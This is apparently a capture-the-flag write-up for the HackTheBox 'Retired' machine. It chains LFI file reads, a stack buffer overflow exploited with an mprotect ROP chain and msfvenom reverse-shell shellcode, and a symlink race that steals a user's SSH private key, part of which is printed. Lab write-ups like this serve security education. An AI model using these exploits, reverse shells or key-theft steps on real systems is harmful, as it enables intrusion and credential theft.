# Retired
![](images/retired.png)

IP: 10.10.11.154

## Nmap
### All ports
```bash
$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.154

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Service Scan
```bash
$ sudo nmap -sC -sV -p 22,80 10.10.11.154 -o nmap.txt

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration
### Port 80
Running gobuster we find some more pages:
```
gobuster dir -u http://10.10.11.154 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x txt,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.194.200
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html
[+] Timeout:                 10s
===============================================================
2022/04/03 13:11:48 Starting gobuster in directory enumeration mode
===============================================================
/js                   (Status: 301) [Size: 162] [--> http://10.129.194.200/js/]
/css                  (Status: 301) [Size: 162] [--> http://10.129.194.200/css/]
/assets               (Status: 301) [Size: 162] [--> http://10.129.194.200/assets/]
/default.html         (Status: 200) [Size: 11414]                                  
/beta.html            (Status: 200) [Size: 4144]                                   
/.                    (Status: 302) [Size: 0] [--> /index.php?page=default.html]
```

Accessing http://10.10.11.154/beta.html we are redirected to http://10.10.11.154/index.php?page=beta.html:
![](retired/images/image1.png)

The page talks about uploading a license file of 512 bits to get into the beta program. When pressing the SUBMIT button we note that it is sending a POST request to `activate_license.php`.

### LFI
So it seems that `index.php` is loading html pages from the `?page=` parameter as we can see above. We can try to load some internal system files:
http://10.10.11.154/index.php?page=/etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

To understand better how the website works lets see the `index.php` source-code:
`/index.php?page=/var/www/html/index.php`
```php
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

So here we have our local-file-inclusion vulnerability.
Now lets see how the `activate_license.php` file works when we press the "SUBMIT" button:
`/index.php?page=/var/www/html/activate_license.php` 
```php
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

Based on the source-code, it is loading the file we submit and sending the file size and file content to a service running on 127.0.0.1 - port 1337. But what is this application running on that port? 
Since we have a LFI vulnerability we can bruteforce the directory `/proc/[PID]/maps` to find out the applications running on the target. 
Using this technique we can find not only files and binaries running in the system but its memory address as well. I will use Burp Intruder module to do this task.
We set the payload position like that:
![](images/image5.png)

And set the payload to sequential numbers like that:
![](images/image6.png)

So we will bruteforce PIDs from 1-500 and see if we get anything interesting:
![](images/image7.png)

We found a `activate_license` binary running on PID 424.

We can read the `/proc/424/cmdline` to check if the binary was started with arguments:
```bash
/usr/bin/activate_license 1337
```

Yes, it seems to be the service running on port 1337 which receives the file we submit on the `beta.html` page.

We can download the binary for local analysis:
```bash
$ curl http://10.129.195.171/index.php?page=/usr/bin/activate_license -o activate_license
```

### Binary analysis
Looking at the `activate_license` binary using Ghidra we can see 2 interesting functions.
- main()
- activate_license()

The main function starts a listening socket for incoming connections on a specified port. At the end it calls a function named `activate_license()`:
`main()`
```c main
int main(int argc,char **argv)

{
  int iVar1;
  __pid_t _Var2;
  int *piVar3;
  char *pcVar4;
  char clientaddr_s [16];
  sockaddr_in clientaddr;
  socklen_t clientaddrlen;
  sockaddr_in server;
  uint16_t port;
  int clientfd;
  int serverfd;
  
  if (argc != 2) {
    error("specify port to bind to");
  }
  iVar1 = __isoc99_sscanf(argv[1],&DAT_00102100,&port);
  if (iVar1 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  printf("[+] starting server listening on port %d\n",(uint)port);
  server.sin_family = 2;
  server.sin_addr = htonl(0x7f000001);
  server.sin_port = htons(port);
  serverfd = socket(2,1,6);
  if (serverfd == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  iVar1 = bind(serverfd,(sockaddr *)&server,0x10);
  if (iVar1 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  iVar1 = listen(serverfd,100);
  if (iVar1 == -1) {
    piVar3 = __errno_location();
    pcVar4 = strerror(*piVar3);
    error(pcVar4);
  }
  puts("[+] listening ...");
  while( true ) {
    while( true ) {
      clientfd = accept(serverfd,(sockaddr *)&clientaddr,&clientaddrlen);
      if (clientfd != -1) break;
      fwrite("Error: accepting client\n",1,0x18,stderr);
    }
    inet_ntop(2,&clientaddr.sin_addr,clientaddr_s,0x10);
    printf("[+] accepted client connection from %s:%d\n",clientaddr_s,(uint)clientaddr.sin_port);
    _Var2 = fork();
    if (_Var2 == 0) break;
    __sysv_signal(0x11,(__sighandler_t)0x1);
    close(clientfd);
  }
  close(serverfd);
  activate_license(clientfd);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

`activate_license()`
```c
void activate_license(int sockfd)

{
  int iVar1;
  ssize_t fileSize;
  int *piVar2;
  char *pcVar3;
  sqlite3_stmt *stmt;
  sqlite3 *db;
  uint32_t msglen;
  char buffer [512];
  
  fileSize = read(sockfd,&msglen,4);
  if (fileSize == -1) {
    piVar2 = __errno_location();
    pcVar3 = strerror(*piVar2);
    error(pcVar3);
  }
  msglen = ntohl(msglen);
  printf("[+] reading %d bytes\n",msglen);
  fileSize = read(sockfd,buffer,(ulong)msglen);
  if (fileSize == -1) {
    piVar2 = __errno_location();
    pcVar3 = strerror(*piVar2);
    error(pcVar3);
  }
  iVar1 = sqlite3_open("license.sqlite",&db);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  sqlite3_busy_timeout(db,2000);
  iVar1 = sqlite3_exec(db,
                       "CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,    license_key TEXT)"
                       ,0,0,0);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  iVar1 = sqlite3_prepare_v2(db,"INSERT INTO license (license_key) VALUES (?)",0xffffffff,&stmt,0);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  iVar1 = sqlite3_bind_text(stmt,1,buffer,0x200,0);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  iVar1 = sqlite3_step(stmt);
  if (iVar1 != 0x65) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  iVar1 = sqlite3_reset(stmt);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  iVar1 = sqlite3_finalize(stmt);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  iVar1 = sqlite3_close(db);
  if (iVar1 != 0) {
    pcVar3 = (char *)sqlite3_errmsg(db);
    error(pcVar3);
  }
  printf("[+] activated license: %s\n",buffer);
  return;
}
```

Based on the source code analysis, the first thing that called my attention was the 512 bytes buffer variable which matches with the website description of the license file size expected.
The logic in the `activate_license` code seems to be:
- Checks if the file size is valid and store it into a variable `msglen`
- Reads `msglen` amount of bytes from the file contents and allocate into the `buffer`

If we could manipulate the file size to something bigger then 512(buffer size) we could potentially overwrite some addresses. Here we have a buffer overflow.

Continuing in the code logic, we see that it is writing the file contents to a database file.
```c
iVar1 = sqlite3_open("license.sqlite",&db);
```

Using the LFI we can find the database file `license.sqlite`. Lets download to analyse it:
```bash
$ curl 10.129.196.121/index.php?page=../license.sqlite -o license.sqlite
```

Looking at the db file locally using `sqlitebrowser` we see one entry of 512 A's:
![[retired/images/image2.png]]
It is writing 512 bytes to the database file, probably if we send 512+ bytes, the extra length will start to overwrite the memory address.

## Buffer Overflow
What do we know so far?
- Buffer is 512+ bytes
- Based on an analysis of `activate_license.php` for a valid POST request we need to send the `license_size`  as 32 bit, big endian byte order before the content.

### Finding the RIP
To find the RIP (rewrite point) we will create a cyclic pattern to identify how many characters we need to cause the buffer overflow.
Lets run the binary using gdb and start creating an exploit skeleton:
```bash
$ gdb activate_license
pwndbg> r 1337                                                            
Starting program: /home/caue/htb/retired/activate/activate_license 1337   
[Thread debugging using libthread_db enabled]                             
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337                                                            
[+] listening ...
```

Exploit skeleton:
```python
from pwn import *

io = remote('127.0.0.1', 1337)
filesize = p32(800, endian='big')   # We need to pack as 32 bit big endian

payload = [
    size,
    cyclic(1000)                    # Create a 1000 characters pattern
]

payload = b"".join(payload)
io.send(payload)
```

Running the exploit script we get a segmentation fault in the binary:
![[retired/images/image3.png]]

Now we look at what value has settled in the RSP register, and calculate the offset to RIP.
```bash
pwndbg> x/xw $rsp
0x7fffffffdd18: 0x66616166
```

```bash
$ python2 -c 'from pwn import *; print cyclic_find(unhex("66616166")[::-1])'
520
```

So we can send 520 bytes before overwriting the RIP.
After exiting the debugger, it would be nice to forcibly kill all web server instances:
```bash
$ ps aux | grep activate_license | awk '{print $2}' | xargs kill -9
```

### Overwritting the RIP
Let's check that we can actually overwrite the return address with an arbitrary value. To do this, we will write a simple Python script that will send 520 A's + `0xd34dc0d3` and check the RIP address:
```python
#!/usr/bin/env python3

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

filesize = p32(800, endian='big')

payload = b''
payload += size
payload += b'A' * 520
payload += p64(0xd34dc0d3)

r = remote('localhost', 1337)
r.sendline(payload)
r.sendline()
```

Once again, start the binary with gdb and run the python exploit:
![[retired/images/image4.png]]
Perfect!

### Exploit plan
Before we continue lets check the binary protections:
```bash
$ checksec --file activate_license
[*] '/home/caue/htb/retired/activate/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We need to find a way to bypass NX. The most common way is doing a return-to-libc attack but in our case it will not work as we need a reverse shell call back.
However, there is a technique that calls `mprotect` from the libc to change the stack mode into executable. So we can inject shellcode into the stack and get a reverse shell.

## Local - Buffer Overflow
Based on the binary protections we can see above, we will not be able to execute shellcode in the stack because of the NX protection. However, there is a couple ways to circunvent that, one of them is a called "ret-to-mprotect" technique.
Basically we can use mprotect to set the stack executable again. For that, we will need some memory addresses to build a ROP chain.

We can use GDB to load the binary and take a look at the memory addresses used. But first, I will turn ASLR off so it makes easier to build our exploit:
```bash
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Load the binary into GDB:
```bash
$ gdb activate_license
```

Run the binary to listen on port 1337:
```bash
pwndbg> r 1337
```

Now we can simply press CTRL + C to pause the execution and have a look at the addresses used with `vmmap`:
![](images/image10.png)

To build our ROP chain we will need the following address, where the arrows are pointing:
- Libc base: `0x7ffff7c79000`
- Stack base: `0x7ffffffde000`
- Stack end: `0x7ffffffff000`

With this addresses plus some gadgets we can make some system calls reusing small pieces of code, this technique is called ROP.

### Finding the gadgets
In order to achieve code execution we will need the following gadgets:
- pop rdi
- pop rsi
- pop rdx
- mprotect
- jmp rsp

Make a copy of the libc used by the binary and use `ropper` to find the gadgets needed:
![](images/image11.png)

With all the addresses above we just need a shellcode to be executed after the `jmp rsp` call. We can use `msfvenom` to create a reverse shell
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp RHOST=127.0.0.1 LPORT=1234 -f py -b '\x00'

Payload size: 119 bytes
Final size of py file: 597 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
shellcode += b"\xef\xff\xff\xff\x48\xbb\xc6\x90\x7e\x57\xca\xcb\x72"
shellcode += b"\xeb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shellcode += b"\xac\xb9\x26\xce\xa0\xc9\x2d\x81\xc7\xce\x71\x52\x82"
shellcode += b"\x5c\x3a\x52\xc4\x90\x7a\x85\x0a\x63\x73\x83\x97\xd8"
shellcode += b"\xf7\xb1\xa0\xdb\x28\x81\xec\xc8\x71\x52\xa0\xc8\x2c"
shellcode += b"\xa3\x39\x5e\x14\x76\x92\xc4\x77\x9e\x30\xfa\x45\x0f"
shellcode += b"\x53\x83\xc9\xc4\xa4\xf9\x10\x78\xb9\xa3\x72\xb8\x8e"
shellcode += b"\x19\x99\x05\x9d\x83\xfb\x0d\xc9\x95\x7e\x57\xca\xcb"
shellcode += b"\x72\xeb"
```

Done! Lets start building our exploit chain.

### Final local exploit
Putting all together:
```python
#!/usr/bin/env python3

from pwn import *

context.clear(arch='amd64')

# pwndbg> vmmap
libc_base = 0x7ffff7c79000
# pwndbg> vmmap
stack_base = 0x7ffffffde000

##########################################
#        FIND THE GADGETS ADDRESS        #
##########################################
# ldd activate_license | grep libc
# cp /lib/x86_64-linux-gnu/libc.so.6 .
# ropper --file libc.so.6 --search 'pop rdi; ret'
pop_rdi = 0x0000000000027c3d
# ropper --file libc.so.6 --search 'pop rdi; rsi'
pop_rsi = 0x000000000002940f
# ropper --file libc.so.6 --search 'pop rdi; rdx'
pop_rdx = 0x00000000000caa2d
# readelf -s libc.so.6 | grep mprotect
mprotect = 0x00000000000f81e0
# ropper --file libc.so.6 --search 'jmp rsp'
jmp_rsp = 0x00000000000465f8

filesize = p32(800, endian='big')

##########################################
#             REVERSE SHELL              #
##########################################
# msfvenom -p linux/x64/shell_reverse_tcp RHOST=127.0.0.1 LPORT=1234 -f py -b '\x00'
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
shellcode += b"\xef\xff\xff\xff\x48\xbb\xc6\x90\x7e\x57\xca\xcb\x72"
shellcode += b"\xeb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shellcode += b"\xac\xb9\x26\xce\xa0\xc9\x2d\x81\xc7\xce\x71\x52\x82"
shellcode += b"\x5c\x3a\x52\xc4\x90\x7a\x85\x0a\x63\x73\x83\x97\xd8"
shellcode += b"\xf7\xb1\xa0\xdb\x28\x81\xec\xc8\x71\x52\xa0\xc8\x2c"
shellcode += b"\xa3\x39\x5e\x14\x76\x92\xc4\x77\x9e\x30\xfa\x45\x0f"
shellcode += b"\x53\x83\xc9\xc4\xa4\xf9\x10\x78\xb9\xa3\x72\xb8\x8e"
shellcode += b"\x19\x99\x05\x9d\x83\xfb\x0d\xc9\x95\x7e\x57\xca\xcb"
shellcode += b"\x72\xeb"

##########################################
#             PAYLOAD CHAIN              #
##########################################
payload = b''
payload += filesize                  # bypass filesize validation
payload += b'A' * 520                # 520 bytes of padding
payload += p64(libc_base + pop_rdx)
payload += p64(0x7)                  # set mprotect to rwxp
payload += p64(libc_base + pop_rsi)
payload += p64(0x21000)              # pwndbg> vmmap  (stack_end - stack_start)
payload += p64(libc_base + pop_rdi)
payload += p64(stack_base)
payload += p64(libc_base + mprotect) # mprotect call
payload += p64(libc_base + jmp_rsp)
payload += shellcode                 # rev shell

r = remote('localhost', 1337)
r.sendline(payload)
```

We can see in the image below:
- Terminal 1: GDB running the binary locally on port 1337
- Terminal 2: Running the python exploit
- Terminal 3: Netcat listener on port 1234
![](images/image12.png)

After running the python script we get our reverse shell back:
```bash
caue@kali:~/htb/retired/activate$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.1.104] from (UNKNOWN) [192.168.1.104] 41374

id
uid=1000(caue) gid=1000(caue) groups=1000(caue),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(wireshark),121(bluetooth),131(scanner),139(kaboxer)
```

Perfect, it works locally, now we need to apply that to the target!

## Remote - Buffer Overflow
In order to exploit this binary remotely we will need to update the exploit to match the target environment.

### Updating the addresses
The first thing we need to do is using the LFI to download the libraries used with the binary so we can extract the addresses needed for the ROP chain.
Looking at the `http://10.10.11.154/index.php?page=/proc/424/maps` we can see the libraries loaded:
![](images/image9.png)

We can focus on these 2 libraries highlighted above and the stack address. 
We will use `libc-2.31.so` to extract most of the addresses for the ROP chain, however we will need a `jmp rsp` address that it does not exist in this library. Thats when `libsqlite3.so.0.8.6` comes in handy. Also the stack start, stack end will be used.

We can easily download the libraries using curl:
```bash
$ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
$ curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6
```

Instead of typing all the ROP addresses manually, we will use the `ROP` function from pwntools. So we can simply load a library like that:
```bash
libc = ELF('./libc.so.6', checksec=False)
rop = ROP([libc])
```

And simply search for gadgets like that:
```bash
pop_rdi = rop.rdi[0]                        
pop_rsi = rop.rsi[0]                        
pop_rdx = rop.rdx[0]                        
jmp_rsp = rop.jmp_rsp[0]                    
```

### Final exploit
Using the information we got from the LFI and using the libraries we just downloaded we can get to a final exploit like below:
```python
#!/usr/bin/env python3

import requests
from pwn import *

context.clear(arch='amd64')

#########################################
#   FIND THE LIBS AND STACK ADDRESSES   #
#########################################
# curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so -o libc-2.31.so
libc = ELF('./libc-2.31.so', checksec=False)
libc.address = 0x7f64e6b94000               # LFI: /proc/402/maps

# curl http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6 -o libsqlite3.so.0.8.6
libsqlite3 = ELF('./libsqlite3.so.0.8.6', checksec=False)
libsqlite3.address = 0x7f64e6d59000         # LFI: /proc/402/maps
stack_base = 0x7ffc836e2000                 # LFI: /proc/402/maps
stack_end = 0x7ffc83703000                  # LFI: /proc/402/maps
stack_size = stack_end - stack_base         # 0x21000

##########################################
#             REVERSE SHELL              #
##########################################
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f py -b '\x00'
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\x50\xa3\x78\xc8\x1f\xfd\xf8"
buf += b"\x70\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x3a\x8a\x20\x51\x75\xff\xa7\x1a\x51\xfd\x77\xcd\x57"
buf += b"\x6a\xb0\xc9\x52\xa3\x7c\x1a\x15\xf7\xf6\x73\x01\xeb"
buf += b"\xf1\x2e\x75\xed\xa2\x1a\x7a\xfb\x77\xcd\x75\xfe\xa6"
buf += b"\x38\xaf\x6d\x12\xe9\x47\xf2\xfd\x05\xa6\xc9\x43\x90"
buf += b"\x86\xb5\x43\x5f\x32\xca\x16\xe7\x6c\x95\xf8\x23\x18"
buf += b"\x2a\x9f\x9a\x48\xb5\x71\x96\x5f\xa6\x78\xc8\x1f\xfd"
buf += b"\xf8\x70"

##########################################
#        FIND THE GADGETS ADDRESS        #
##########################################
rop = ROP([libc, libsqlite3])               # Load the libs to start ROP chain
# search ROP Gadgets                   
mprotect = libc.symbols['mprotect']         # 0xf8c20   readelf -s libc.so.6 | grep mprotect
pop_rdi = rop.rdi[0]                        # 0x26796   ropper -f libc.so.6 --search "pop rdi; ret"
pop_rsi = rop.rsi[0]                        # 0x2890f   ropper -f libc.so.6 --search "pop rsi; ret"
pop_rdx = rop.rdx[0]                        # 0xcb1cd   ropper -f libc.so.6 --search "pop rdx; ret"
jmp_rsp = rop.jmp_rsp[0]                    # 0xd431d   ropper -f libsqlite3.so.0.8.6 --search "jmp rsp"

offset = 520

##########################################
#            PAYLOAD CHAIN               #
##########################################
payload = b'A' * offset
#int mprotect(void *addr, size_t len, int prot);
payload += p64(pop_rdi) + p64(stack_base)       # addr = Begin of Stack
payload += p64(pop_rsi) + p64(stack_size)       # len = size of Stack
payload += p64(pop_rdx) + p64(7)                # prot = Permission 7 -> rwx
payload += p64(mprotect)                        # call mprotect
payload += p64(jmp_rsp)                         # jmp rsp
payload += buf                                  # reverse shell

# Save payload to a file
write('payload.txt', payload)

# Upload the payload
test_url = "http://10.10.11.154/activate_license.php"
test_response = requests.post(test_url, files = {"licensefile": payload})
if test_response.ok:
    print("Payload sent successfully!")
    print(test_response.text)
else:
    print("Something went wrong!")
```


## WWW-DATA user
After the binary exploitation successfully done we get a sheel as `www-data`.
![](images/image13.png)

### Privilege escalation 1
Enumerating the system we find an interesting bash script `/usr/bin/webbackup`:
```bash
#!/bin/bash
set -euf -o pipefail
cd /var/www/
SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"
KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

If we look at `/var/www`:
```
www-data@retired:/var/www$ ls -la
total 2008
drwxrwsrwx  3 www-data www-data   4096 Apr 29 04:20 .
drwxr-xr-x 12 root     root       4096 Mar 11 14:36 ..
-rw-r--r--  1 www-data www-data 505153 Apr 29 04:18 2022-04-29_04-18-04-html.zip
-rw-r--r--  1 dev      www-data 505153 Apr 29 04:18 2022-04-29_04-18-06-html.zip
-rw-r--r--  1 dev      www-data 505153 Apr 29 04:19 2022-04-29_04-19-06-html.zip
-rw-r--r--  1 dev      www-data 505153 Apr 29 04:20 2022-04-29_04-20-06-html.zip
drwxrwsrwx  5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r--  1 www-data www-data  12288 Apr 29 04:05 license.sqlite
```

It seems that the user `dev` is making use of this script at every minute to make a backup of the web files.

Create symlink to user `dev` SSH private key:
```bash
www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key
www-data@retired:/var/www/html$ ls -la
total 48
drwxrwsrwx 5 www-data www-data  4096 Apr 29 04:29 .
drwxrwsrwx 3 www-data www-data  4096 Apr 29 04:29 ..
-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php
drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets
-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css
-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html
lrwxrwxrwx 1 www-data www-data    21 Apr 29 04:29 dev_key -> /home/dev/.ssh/id_rsa
-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js
```

It is a racing condition as the `webbackup` script will do a cleanup before zipping the files. We need to constantly being creating this symbolic link when the time comes.

```bash
www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
ln: failed to create symbolic link 'dev_key': File exists                                                                                                
www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa dev_key                                                                                      
ln: failed to create symbolic link 'dev_key': File exists
...
...
```

Until finally the script is triggered and we can unzip the backup file containing the user ssh key:
```bash
www-data@retired:/var/www$ mkdir test
www-data@retired:/var/www$ cp 2022-04-29_04-33-06-html.zip test/
www-data@retired:/var/www$ cd test/
www-data@retired:/var/www/test$ unzip 2022-04-29_04-33-06-html.zip
Archive:  2022-04-29_04-33-06-html.zip 
   creating: var/www/html/
   creating: var/www/html/js/
  inflating: var/www/html/js/scripts.js  
  inflating: var/www/html/dev_key    
  inflating: var/www/html/activate_license.php  
   creating: var/www/html/assets/
  inflating: var/www/html/assets/favicon.ico  
   creating: var/www/html/assets/img/
  inflating: var/www/html/assets/img/close-icon.svg  
  inflating: var/www/html/assets/img/navbar-logo.svg  
   creating: var/www/html/assets/img/about/
  inflating: var/www/html/assets/img/about/2.jpg  
  inflating: var/www/html/assets/img/about/4.jpg  
  inflating: var/www/html/assets/img/about/3.jpg  
  inflating: var/www/html/assets/img/about/1.jpg  
   creating: var/www/html/assets/img/logos/
  inflating: var/www/html/assets/img/logos/facebook.svg  
  inflating: var/www/html/assets/img/logos/microsoft.svg  
  inflating: var/www/html/assets/img/logos/google.svg  
  inflating: var/www/html/assets/img/logos/ibm.svg  
   creating: var/www/html/assets/img/team/
  inflating: var/www/html/assets/img/team/2.jpg  
  inflating: var/www/html/assets/img/team/3.jpg  
  inflating: var/www/html/assets/img/team/1.jpg  
  inflating: var/www/html/assets/img/header-bg.jpg  
  inflating: var/www/html/beta.html  
  inflating: var/www/html/default.html   
  inflating: var/www/html/index.php  
   creating: var/www/html/css/
  inflating: var/www/html/css/styles.css
```

Reading the private key:
```
www-data@retired:/var/www/test/var/www/html$ cat dev_key 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA58qqrW05/urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yf
db6Nzw5wfLeLD4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdkHGu0qQr
AnCIpK3Gb74zh6pe03zHVcZyLR2tXWmoXqRF8gE2hsry/AECZRSfaYRhac6lASRZD74bQb
xOeSuNyMfCsbJ/xKvlupiMKcbD+7RHysCSM6xkgBoJ+rraSpYTiXs/vihkp6pN2jMRa/ee
ADRNWoyqU7LVsKwhZ//AxKjJSvDSnaUeIDaKZ6e4XYsOKTXX3Trh7u9Bjv2YFD8DRDEmDI
5d+t6Imws8370a/5Z2z7C7jfCpzDATek0NIqLi3jEmI/8vLO9xIckjaNVoqw/BVKNqjd03
KKK2Y0c5DRArFmwkJdmbGxwzyTV8oQZdjw0mVBFjbdQ0iiQBEFGNP9/zpT//ewaosZYROE
4FHXNEIq23Z3SxUNyUeLqkI8Mlf0McBmvc/ozGR5AAAFgKXd9Tyl3fU8AAAAB3NzaC1yc2
EAAAGBAOfKqq1tOf7qxygqgoHCD4RpGutGPp0HJ4B0uiLxuOIHG98NBzf8n3W+jc8OcHy3
iw+Lg7fJPTO0T4JHZyEcHTRcZXjR7h1pitI+zjkNK1LK7PC7nTnZBxrtKkKwJwiKStxm++
M4eqXtN8x1XGci0drV1pqF6kRfIBNobK8vwBAmUUn2mEYWnOpQEkWQ++G0G8TnkrjcjHwr
